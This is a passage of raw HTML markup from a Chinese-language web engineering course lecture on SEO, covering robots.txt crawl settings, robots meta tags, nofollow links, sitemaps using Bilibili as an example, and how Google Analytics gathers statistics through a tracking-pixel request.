data-first-offset="true"><span data-slate-string="true">[第 28 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1435"><span data-slate-leaf="true" data-offset-key="1435:0" 
data-first-offset="true"><span data-slate-string="true"> 中介绍的类似的“默认值 + 特殊值覆写”的配置方式）。最后一行是网站地图 
sitemap.xml 的位置，我们下面会讲。</span></span></span> </div> <div class="se-a8042456 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1436"> <span data-slate-object="text" data-key="1437"><span 
data-slate-leaf="true" data-offset-key="1437:0" data-first-offset="true"><span data-slate-string="true">另外，如果你想让搜索引擎友好一点，就不要那么频繁地访问你的网站，你可以使用 
Crawl-delay 参数，用来告知连续的请求之间至少间隔多少秒，比如：</span></span></span> </div> <div class="se-518d64de se-99ab36d9" 
data-slate-type="pre" data-slate-object="block" data-key="1438"> <div class="se-a1728700 se-9f12f99b"> 
<span></span> </div> <div class="se-535fce32"> <div class="se-3f575cc4 se-9544edac" data-code-line-number="1"></div> 
</div> <div class="se-6ebc6046 ps"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1439"> <span data-slate-object="text" data-key="1440"><span 
data-slate-leaf="true" data-offset-key="1440:0" data-first-offset="true"><span data-slate-string="true">Crawl-delay: 
5</span></span></span> </div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div 
class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" 
style="top: 0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 
0px;"></div> </div> </div> </div> <div class="se-061242b1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1441"> <span data-slate-object="text" data-key="1442"><span data-slate-leaf="true" 
data-offset-key="1442:0" data-first-offset="true"><span data-slate-string="true">同样的，你可以看看百度的 
roberts.txt，访问 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1443" 
class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1444"><span data-slate-leaf="true" 
data-offset-key="1444:0" data-first-offset="true"><span data-slate-string="true">https://www.baidu.com/robots.txt</span></span></span></a><span 
data-slate-object="text" data-key="1445"><span data-slate-leaf="true" data-offset-key="1445:0" 
data-first-offset="true"><span data-slate-string="true">，你会看到百度比较“特立独行”，它不允许 Google、有道、搜狗等多家搜索引擎的数据爬取。</span></span></span> 
</div> <div class="se-3fb7d34d " data-slate-type="paragraph" data-slate-object="block" data-key="1446"> 
<span data-slate-object="text" data-key="1447"><span data-slate-leaf="true" data-offset-key="1447:0" 
data-first-offset="true"><span data-slate-string="true">除了全站的搜索引擎爬取设定以外，能够按页来设置吗？可以，这时候你需要使用一个名为 
robots 的 meta 标签，这个标签在 HTML 的 head 内，用来告知该页的爬取策略。</span></span></span> </div> <div class="se-751195e6 
se-e19b3ee7" data-slate-type="pre" data-slate-object="block" data-key="1448" data-code-language="javascript"> 
<div class="se-aff1edd2 se-65bcf1aa"> <span></span> </div> <div class="se-70a6dd66"> <div class="se-3b7f4357 
se-a2ab1716" data-code-line-number="1"></div> </div> <div class="se-f96ecce6 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1449"> <span data-slate-object="text" data-key="1450"><span data-slate-leaf="true" 
data-offset-key="1450:0" data-first-offset="true"><span data-slate-string="true">&lt;meta name=</span></span><span 
data-slate-leaf="true" data-offset-key="1450:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_4170556356" data-annotation-type="annotation"><span data-slate-string="true">"robots"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1450:2"><span data-slate-string="true"> content=</span></span><span 
data-slate-leaf="true" data-offset-key="1450:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_4734278600" data-annotation-type="annotation"><span data-slate-string="true">"noindex,nofollow"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1450:4"><span data-slate-string="true"> /&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 348px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-5cde828c " data-slate-type="paragraph" data-slate-object="block" 
data-key="1451"> <span data-slate-object="text" data-key="1452"><span data-slate-leaf="true" 
data-offset-key="1452:0" data-first-offset="true"><span data-slate-string="true">除页面以外，HTML 
的 a 标签（链接）也能够告诉搜索引擎不要进一步追踪爬取，方法就是使用 nofollow，如下：</span></span></span> </div> <div class="se-de829b3b 
se-91074fcb" data-slate-type="pre" data-slate-object="block" data-key="1453" data-code-language="javascript"> 
<div class="se-b60409f6 se-cf73c586"> <span></span> </div> <div class="se-4c071779"> <div class="se-822d1fd9 
se-6b77e003" data-code-line-number="1"></div> </div> <div class="se-93446553 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1454"> <span data-slate-object="text" data-key="1455"><span data-slate-leaf="true" 
data-offset-key="1455:0" data-first-offset="true"><span data-slate-string="true">&lt;a href=</span></span><span 
data-slate-leaf="true" data-offset-key="1455:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6681702614" data-annotation-type="annotation"><span data-slate-string="true">"http://www.another-website.com/"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1455:2"><span data-slate-string="true"> rel=</span></span><span 
data-slate-leaf="true" data-offset-key="1455:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6137314371" data-annotation-type="annotation"><span data-slate-string="true">"nofollow"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1455:4"><span data-slate-string="true">&gt; 另一个站点 &lt;</span></span><span 
data-slate-leaf="true" data-offset-key="1455:5"><span class=" gkhl-regexp" data-slate-object="annotation" 
data-annotation-key="gkann_7508621446" data-annotation-type="annotation"><span data-slate-string="true">/a&gt;</span></span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 239px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-f18bd67a " data-slate-type="paragraph" data-slate-object="block" 
data-key="1456"> <span data-slate-object="text" data-key="1457"><span data-slate-leaf="true" 
data-offset-key="1457:0" data-first-offset="true"><span data-slate-string="true">因此，是否允许爬取的建议，是可以在网站、页面和链接这三个级别分别设置的。</span></span></span> 
</div> <h3 class="se-afd24430" data-slate-type="heading" data-slate-object="block" data-key="1458"><span 
data-slate-object="text" data-key="1459"><span data-slate-leaf="true" data-offset-key="1459:0" 
data-first-offset="true"><span data-slate-string="true">4. 网站地图</span></span></span></h3> <div 
class="se-4f20f700 " data-slate-type="paragraph" data-slate-object="block" data-key="1460"> 
<span data-slate-object="text" data-key="1461"><span data-slate-leaf="true" data-offset-key="1461:0" 
data-first-offset="true"><span data-slate-string="true">网站地图就像前面提到的 roberts.txt 一样，是另一个和搜索引擎对话的途径。网站可能非常大，爬取一遍耗时长，但</span></span></span><span 
data-slate-object="text" data-key="1462"><span data-slate-leaf="true" data-offset-key="1462:0" 
data-first-offset="true"><span class="se-4e378773" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">网站地图则可以清晰直接地告诉搜索引擎网站内“重要”的页面都有哪些（无论是否被链接指向），它们的更新习惯，包括最近一次是什么时候更新的，更新频率是多少，以及对于整个网站来说，不同页面的重要性比重是多少。</span></span></span></span> 
</div> <div class="se-5744d9b1 " data-slate-type="paragraph" data-slate-object="block" data-key="1463"> 
<span data-slate-object="text" data-key="1464"><span data-slate-leaf="true" data-offset-key="1464:0" 
data-first-offset="true"><span data-slate-string="true">对于使用 SPA（我们曾在 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1465" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1466"><span data-slate-leaf="true" data-offset-key="1466:0" 
data-first-offset="true"><span data-slate-string="true">[第 17 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1467"><span data-slate-leaf="true" data-offset-key="1467:0" 
data-first-offset="true"><span data-slate-string="true"> 介绍过 SPA，你可以回看）的网站应用来说，由于缺乏页面跳转，搜索引擎无法正确理解页面的关系、更新、指向等等，网站地图就显得更为重要了。</span></span></span> 
</div> <div class="se-5822d120 " data-slate-type="paragraph" data-slate-object="block" data-key="1468"> 
<span data-slate-object="text" data-key="1469"><span data-slate-leaf="true" data-offset-key="1469:0" 
data-first-offset="true"><span data-slate-string="true">这次我来拿 B 站举个例子，访问 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1470" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1471"><span data-slate-leaf="true" data-offset-key="1471:0" 
data-first-offset="true"><span data-slate-string="true">https://www.bilibili.com/sitemap.xml</span></span></span></a><span 
data-slate-object="text" data-key="1472"><span data-slate-leaf="true" data-offset-key="1472:0" 
data-first-offset="true"><span data-slate-string="true">，你会看到如下的内容：</span></span></span> </div> 
<div class="se-16ce946e se-8cdca553" data-slate-type="pre" data-slate-object="block" data-key="1473" 
data-code-language="cpp"> <div class="se-da84c1ed se-c4c93f4d"> <span></span> </div> <div class="se-ffd523a9"> 
<div class="se-4f3e0323 se-7a294bdd" data-code-line-number="1"></div> <div class="se-4f3e0323 
se-7a294bdd" data-code-line-number="2"></div> <div class="se-4f3e0323 se-7a294bdd" data-code-line-number="3"></div> 
<div class="se-4f3e0323 se-7a294bdd" data-code-line-number="4"></div> <div class="se-4f3e0323 
se-7a294bdd" data-code-line-number="5"></div> <div class="se-4f3e0323 se-7a294bdd" data-code-line-number="6"></div> 
<div class="se-4f3e0323 se-7a294bdd" data-code-line-number="7"></div> </div> <div class="se-fd1a5213 
ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1474"> <span data-slate-object="text" data-key="1475"><span data-slate-leaf="true" 
data-offset-key="1475:0" data-first-offset="true"><span data-slate-string="true">&lt;sitemapindex 
xmlns=</span></span><span data-slate-leaf="true" data-offset-key="1475:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_8653011033" data-annotation-type="annotation"><span 
data-slate-string="true">"http://www.sitemaps.org/schemas/sitemap/0.9"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1475:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1476"> <span data-slate-object="text" data-key="1477"><span data-slate-leaf="true" 
data-offset-key="1477:0" data-first-offset="true"><span data-slate-string="true"> &lt;sitemap&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1478"> <span data-slate-object="text" data-key="1479"><span data-slate-leaf="true" 
data-offset-key="1479:0" data-first-offset="true"><span data-slate-string="true"> &lt;loc&gt;http:</span></span><span 
data-slate-leaf="true" data-offset-key="1479:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_1088053945" data-annotation-type="annotation"><span data-slate-string="true">//www.bilibili.com/sitemap/v.xml&lt;/loc&gt;</span></span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1480"> <span data-slate-object="text" data-key="1481"><span data-slate-leaf="true" 
data-offset-key="1481:0" data-first-offset="true"><span data-slate-string="true"> &lt;lastmod&gt;</span></span><span 
data-slate-leaf="true" data-offset-key="1481:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9111319875" data-annotation-type="annotation"><span data-slate-string="true">2019</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:2"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4461534520" data-annotation-type="annotation"><span data-slate-string="true">-10</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5521086258" data-annotation-type="annotation"><span data-slate-string="true">-26</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:4"><span data-slate-string="true">T18:</span></span><span 
data-slate-leaf="true" data-offset-key="1481:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1559466829" data-annotation-type="annotation"><span data-slate-string="true">25</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:6"><span data-slate-string="true">:</span></span><span 
data-slate-leaf="true" data-offset-key="1481:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5501687486" data-annotation-type="annotation"><span data-slate-string="true">05.328</span></span></span><span 
data-slate-leaf="true" data-offset-key="1481:8"><span data-slate-string="true">Z&lt;/lastmod&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1482"> <span data-slate-object="text" data-key="1483"><span data-slate-leaf="true" 
data-offset-key="1483:0" data-first-offset="true"><span data-slate-string="true"> &lt;/sitemap&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1484"> <span data-slate-object="text" data-key="1485"><span data-slate-leaf="true" 
data-offset-key="1485:0" data-first-offset="true"><span data-slate-string="true"> ...</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1486"> <span data-slate-object="text" data-key="1487"><span data-slate-leaf="true" 
data-offset-key="1487:0" data-first-offset="true"><span data-slate-string="true">&lt;/sitemapindex&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 258px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-741ed86e " data-slate-type="paragraph" data-slate-object="block" 
data-key="1488"> <span data-slate-object="text" data-key="1489"><span data-slate-leaf="true" 
data-offset-key="1489:0" data-first-offset="true"><span data-slate-string="true">它是由多个子 sitemap 
配置文件组成的，随便打开一个，比如 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1490" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1491"><span 
data-slate-leaf="true" data-offset-key="1491:0" data-first-offset="true"><span data-slate-string="true">http://www.bilibili.com/sitemap/v.xml</span></span></span></a><span 
data-slate-object="text" data-key="1492"><span data-slate-leaf="true" data-offset-key="1492:0" 
data-first-offset="true"><span data-slate-string="true">：</span></span></span> </div> <div 
class="se-74ccf899 se-35f38ce0" data-slate-type="pre" data-slate-object="block" data-key="1493" 
data-code-language="cpp"> <div class="se-b5ab256e se-92b0a78a"> <span></span> </div> <div class="se-ebf67f18"> 
<div class="se-be2b321e se-9b445acb" data-code-line-number="1"></div> <div class="se-be2b321e 
se-9b445acb" data-code-line-number="2"></div> <div class="se-be2b321e se-9b445acb" data-code-line-number="3"></div> 
<div class="se-be2b321e se-9b445acb" data-code-line-number="4"></div> <div class="se-be2b321e 
se-9b445acb" data-code-line-number="5"></div> <div class="se-be2b321e se-9b445acb" data-code-line-number="6"></div> 
<div class="se-be2b321e se-9b445acb" data-code-line-number="7"></div> <div class="se-be2b321e 
se-9b445acb" data-code-line-number="8"></div> </div> <div class="se-eda7243d ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1494"> <span data-slate-object="text" data-key="1495"><span data-slate-leaf="true" 
data-offset-key="1495:0" data-first-offset="true"><span data-slate-string="true">&lt;urlset 
xmlns=</span></span><span data-slate-leaf="true" data-offset-key="1495:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_1643297433" data-annotation-type="annotation"><span 
data-slate-string="true">"http://www.sitemaps.org/schemas/sitemap/0.9"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1495:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1496"> <span data-slate-object="text" data-key="1497"><span data-slate-leaf="true" 
data-offset-key="1497:0" data-first-offset="true"><span data-slate-string="true"> &lt;url&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1498"> <span data-slate-object="text" data-key="1499"><span data-slate-leaf="true" 
data-offset-key="1499:0" data-first-offset="true"><span data-slate-string="true"> &lt;loc&gt;http:</span></span><span 
data-slate-leaf="true" data-offset-key="1499:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_5939313121" data-annotation-type="annotation"><span data-slate-string="true">//www.bilibili.com/v/douga/&lt;/loc&gt;</span></span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1500"> <span data-slate-object="text" data-key="1501"><span data-slate-leaf="true" 
data-offset-key="1501:0" data-first-offset="true"><span data-slate-string="true"> &lt;lastmod&gt;</span></span><span 
data-slate-leaf="true" data-offset-key="1501:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_3687242308" data-annotation-type="annotation"><span data-slate-string="true">2019</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:2"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_0517769396" data-annotation-type="annotation"><span data-slate-string="true">-10</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8110135945" data-annotation-type="annotation"><span data-slate-string="true">-26</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:4"><span data-slate-string="true">T18:</span></span><span 
data-slate-leaf="true" data-offset-key="1501:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9577925384" data-annotation-type="annotation"><span data-slate-string="true">25</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:6"><span data-slate-string="true">:</span></span><span 
data-slate-leaf="true" data-offset-key="1501:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5507680647" data-annotation-type="annotation"><span data-slate-string="true">17.629</span></span></span><span 
data-slate-leaf="true" data-offset-key="1501:8"><span data-slate-string="true">Z&lt;/lastmod&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1502"> <span data-slate-object="text" data-key="1503"><span data-slate-leaf="true" 
data-offset-key="1503:0" data-first-offset="true"><span data-slate-string="true"> &lt;changefreq&gt;daily&lt;/changefreq&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1504"> <span data-slate-object="text" data-key="1505"><span data-slate-leaf="true" 
data-offset-key="1505:0" data-first-offset="true"><span data-slate-string="true"> &lt;/url&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1506"> <span data-slate-object="text" data-key="1507"><span data-slate-leaf="true" 
data-offset-key="1507:0" data-first-offset="true"><span data-slate-string="true"> ...</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1508"> <span data-slate-object="text" data-key="1509"><span data-slate-leaf="true" 
data-offset-key="1509:0" data-first-offset="true"><span data-slate-string="true">&lt;/urlset&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 284px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-316d65ce " data-slate-type="paragraph" data-slate-object="block" 
data-key="1510"> <span data-slate-object="text" data-key="1511"><span data-slate-leaf="true" 
data-offset-key="1511:0" data-first-offset="true"><span data-slate-string="true">可以说一目了然，页面位置、上次修改时间，以及修改频率。这可以让搜索引擎有目的和有条件地扫描和爬取页面数据。</span></span></span> 
</div> <div class="se-fe49c1d7 " data-slate-type="paragraph" data-slate-object="block" data-key="1512"> 
<span data-slate-object="text" data-key="1513"><span data-slate-leaf="true" data-offset-key="1513:0" 
data-first-offset="true"><span data-slate-string="true">对于网站地图，除了被动等待爬虫的抓取，搜索引擎服务往往还提供另一种方式来报告网站地图的变更，那就是</span></span></span><span 
data-slate-object="text" data-key="1514"><span data-slate-leaf="true" data-offset-key="1514:0" 
data-first-offset="true"><span class="se-ac2b91f1" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">允许网站管理员主动去提交变更信息，这种方式和爬虫来爬取比较起来，类似于我们从第一章就开始讲的 pull 和 push 的区别</span></span></span></span><span 
data-slate-object="text" data-key="1515"><span data-slate-leaf="true" data-offset-key="1515:0" 
data-first-offset="true"><span data-slate-string="true">，这种方式对于网站管理员来说更麻烦，但是显然可以更为及时地让搜索引擎获知并收录最新数据。</span></span></span> 
</div> <div class="se-92320066 " data-slate-type="paragraph" data-slate-object="block" data-key="1516"> 
<span data-slate-object="text" data-key="1517"><span data-slate-leaf="true" data-offset-key="1517:0" 
data-first-offset="true"><span data-slate-string="true">这种方式从实现上说，就是由搜索引擎服务的提供商开放了一个 Web API，网站在内容变更的时候调用，去通知搜索引擎（关于 
Web API 的设计，你可以回看 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1518" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1519"><span 
data-slate-leaf="true" data-offset-key="1519:0" data-first-offset="true"><span data-slate-string="true">[第 
05 讲]</span></span></span></a><span data-slate-object="text" data-key="1520"><span data-slate-leaf="true" 
data-offset-key="1520:0" data-first-offset="true"><span data-slate-string="true">）。</span></span></span> 
</div> <h3 class="se-b2b562cc" data-slate-type="heading" data-slate-object="block" data-key="1521"><span 
data-slate-object="text" data-key="1522"><span data-slate-leaf="true" data-offset-key="1522:0" 
data-first-offset="true"><span data-slate-string="true">5. 统计分析</span></span></span></h3> <div 
class="se-c5129bc6 " data-slate-type="paragraph" data-slate-object="block" data-key="1523"> 
<span data-slate-object="text" data-key="1524"><span data-slate-leaf="true" data-offset-key="1524:0" 
data-first-offset="true"><span data-slate-string="true">在进行 SEO 的改动调整之后，我们需要一些方式来跟踪和评估效果。像 
Google Analytics 和百度统计，就提供了这样的功能。</span></span></span> </div> <div class="se-24f7d8f2 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1525"> <span data-slate-object="text" data-key="1526"><span 
data-slate-leaf="true" data-offset-key="1526:0" data-first-offset="true"><span data-slate-string="true">原理上很简单，以 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1527" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1528"><span data-slate-leaf="true" data-offset-key="1528:0" 
data-first-offset="true"><span data-slate-string="true">Google Analytics</span></span></span></a><span 
data-slate-object="text" data-key="1529"><span data-slate-leaf="true" data-offset-key="1529:0" 
data-first-offset="true"><span data-slate-string="true"> 为例，它会为你的网站生成一段 JavaScript 代码，你就可以把它嵌入每一个你希望得到跟踪的网页。这样，在页面访问时，这段代码会收集相关信息，并向页面嵌入一个大小为 
1 像素的 gif 图片，而这个图片的 URL 带有当前浏览器、操作系统等等客户端的不同类型的信息。这样，Google Analytics 就可以捕获这些信息来完成数据统计了。</span></span></span> 
</div> <div class="se-82794e8f " data-slate-type="paragraph" data-slate-object="block" data-key="1530"> 
<span data-slate-object="text" data-key="1531"><span data-slate-leaf="true" data-offset-key="1531:0" 
data-first-offset="true"><span data-slate-string="true">下面给出了我在 Mac 上访问极客时间的页面时，网页向 Google 
Analytics 服务器发送的统计信息 URL（别看这个 URL 没有 gif 字样，但这个请求返回的就是一个 gif 图片，这一点可以从响应的 Content-Type 中看出来）：</span></span></span> 
</div> <div class="se-5a4f8313 se-59b3fb7d" data-slate-type="pre" data-slate-object="block" 
data-key="1532" data-code-language="javascript"> <div class="se-f9b2bc77 se-02537653"> <span></span> 
</div> <div class="se-7a125a77"> <div class="se-ab1813f1 se-e10f634b" data-code-line-number="1"></div> 
</div> <div class="se-4200ac6c ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1533"> <span data-slate-object="text" data-key="1534"><span 
data-slate-leaf="true" data-offset-key="1534:0" data-first-offset="true"><span data-slate-string="true">https:</span></span><span 
data-slate-leaf="true" data-offset-key="1534:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_0200744214" data-annotation-type="annotation"><span data-slate-string="true">//www.google-analytics.com/collect?v=1&amp;_v=j79&amp;a=775923213&amp;t=pageview&amp;_s=1&amp;dl=https%3A%2F%2Ftime.geekbang.org%2F&amp;ul=en-us&amp;de=UTF-8&amp;dt=%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4&amp;sd=24-bit&amp;sr=1440x900&amp;vp=575x729&amp;je=0&amp;_u=AACAAEAB~&amp;jid=&amp;gjid=&amp;cid=248548954.1568164577&amp;tid=UA-103082599-6&amp;_gid=817127427.1571674409&amp;z=266312543</span></span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 53px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-3af11126 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1535"> <span data-slate-object="text" data-key="1536"><span data-slate-leaf="true" 
data-offset-key="1536:0" data-first-offset="true"><span data-slate-string="true">通过收集这样的信息，可以获得很多网站用户的情况统计，比如访问量、页面停留时间、地区分布、电脑访问或手机访问的比例等等，并能观察这样的统计信息基于时间的走势。</span></span></span> 
</div> <h2 class="se-3db70928" data-slate-type="heading" data-slate-object="block" data-key="1537"><span 
data-slate-object="text" data-key="1538"><span data-slate-leaf="true" data-offset-key="1538:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-444335cf " data-slate-type="paragraph" data-slate-object="block" data-key="1539"> 
<span data-slate-object="text" data-key="1540"><span data-slate-leaf="true" data-offset-key="1540:0" 
data-first-offset="true"><span data-slate-string="true">今天我们学习了一些互联网搜索引擎的工作机制，并结合例子从工程的角度了解了几个常见的 
SEO 相关技术。今天我们就不放具体的思考题了，但 SEO 本身是一个可以挖掘很深的领域，我在扩展阅读中放置了一些资料，供你延伸。</span></span></span> </div> 
<div class="se-8248b28b " data-slate-type="paragraph" data-slate-object="block" data-key="1541"> 
<span data-slate-object="text" data-key="1542"><span data-slate-leaf="true" data-offset-key="1542:0" 
data-first-offset="true"><span data-slate-string="true">好，到今天为止，“寻找最佳实践”这一章就接近尾声了，你是否有所收获、有所体会，欢迎你在留言区分享。</span></span></span> 
</div> <h2 class="se-4a2c6d26" data-slate-type="heading" data-slate-object="block" data-key="1543"><span 
data-slate-object="text" data-key="1544"><span data-slate-leaf="true" data-offset-key="1544:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-b5e02895" data-slate-type="list" data-slate-object="block" data-key="1545"> <div 
class="se-c0c0ac44 se-3e8f772e" data-slate-type="list-line" data-slate-object="block" data-key="1546"> 
<span data-slate-object="text" data-key="1547"><span data-slate-leaf="true" data-offset-key="1547:0" 
data-first-offset="true"><span data-slate-string="true">文中介绍了几个典型的 SEO 黑帽法，作为视野的拓展，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1548" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1549"><span data-slate-leaf="true" data-offset-key="1549:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="1550"><span data-slate-leaf="true" data-offset-key="1550:0" 
data-first-offset="true"><span data-slate-string="true">了解更多的黑帽法。特别地，你也可以参阅这一</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1551" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1552"><span data-slate-leaf="true" data-offset-key="1552:0" 
data-first-offset="true"><span data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" 
data-key="1553"><span data-slate-leaf="true" data-offset-key="1553:0" data-first-offset="true"><span 
data-slate-string="true">了解更多历史上的 “Google 轰炸”事件。</span></span></span> </div> <div class="se-6e8f8cdb 
se-db8e4517" data-slate-type="list-line" data-slate-object="block" data-key="1554"> <span data-slate-object="text" 
data-key="1555"><span data-slate-leaf="true" data-offset-key="1555:0" data-first-offset="true"><span 
data-slate-string="true">如果对 Google Analytics 感兴趣的话，那么官方有一些很好的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1556" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="1557"><span data-slate-leaf="true" data-offset-key="1557:0" data-first-offset="true"><span 
data-slate-string="true">学习材料</span></span></span></a><span data-slate-object="text" data-key="1558"><span 
data-slate-leaf="true" data-offset-key="1558:0" data-first-offset="true"><span data-slate-string="true">；如果用的是百度统计，那么你也可以浏览一下官方的</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1559" class="se-d795ea91 se-eb2c7cbb"><span 
